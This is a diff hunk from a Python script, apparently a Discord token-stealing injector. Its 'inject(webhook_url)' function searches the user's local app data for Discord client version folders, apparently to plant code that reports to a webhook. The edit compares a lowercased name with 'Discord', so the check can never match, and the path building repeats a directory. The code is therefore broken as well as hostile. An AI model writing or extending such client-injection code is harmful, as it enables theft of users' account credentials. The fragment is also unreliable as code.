@@ -425,7 +425,7 @@ def cleanup():
 def inject(webhook_url):
     appdata = os.getenv("localappdata")
     for _dir in os.listdir(appdata):
-        if 'discord' in _dir.lower():
+        if 'Discord' in _dir.lower():
             for dir in os.listdir(os.path.abspath(appdata+os.sep+_dir)):
                 if match(r'app-(\d.\d)*', dir):
                     abspath = os.path.abspath(appdata+os.sep+_dir+os.sep+_dir) 
